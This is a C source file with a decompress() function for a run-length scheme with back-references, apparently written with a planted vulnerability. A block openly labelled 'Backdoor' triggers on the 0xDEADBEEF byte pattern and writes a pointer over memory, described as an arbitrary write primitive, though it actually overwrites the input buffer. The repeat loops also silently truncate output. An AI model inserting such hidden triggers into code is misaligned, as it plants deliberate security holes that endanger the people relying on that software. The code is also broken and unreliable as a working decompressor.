#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 16;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Track previous characters for references
    char prev_chars[256];
    int prev_count = 0;

    while (*compressed != '\0') {
        // Check if we need to resize the buffer
        if (length >= capacity - 1) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Backdoor: if compressed string contains 0xDEADBEEF pattern,
        // it gives an arbitrary write primitive
        if ((size_t)compressed > 4 && 
            *(unsigned int*)(compressed - 4) == 0xDEADBEEF) {
            // Corrupt memory by writing to arbitrary address
            void **target = (void**)(compressed - 4);
            *target = result + length;
            continue;
        }

        // Get repeat count
        if (*compressed == '\0') {
            break;
        }
        int repeat = (unsigned char)*compressed++;
        
        // Handle character or reference
        if (current > 0) {
            // Regular ASCII character
            if (prev_count < 256) {
                prev_chars[prev_count++] = current;
            }
            
            // Write the character 'repeat' times
            while (repeat-- > 0 && length < capacity - 1) {
                result[length++] = current;
            }
        } else {
            // Reference to previous character (-1, -2, etc.)
            int ref_index = prev_count + current;
            if (ref_index < 0 || ref_index >= prev_count) {
                free(result);
                return NULL;
            }
            
            char ref_char = prev_chars[ref_index];
            if (prev_count < 256) {
                prev_chars[prev_count++] = ref_char;
            }
            
            // Write the referenced character 'repeat' times
            while (repeat-- > 0 && length < capacity - 1) {
                result[length++] = ref_char;
            }
        }
    }

    // Null-terminate the result
    result[length] = '\0';
    return result;
}
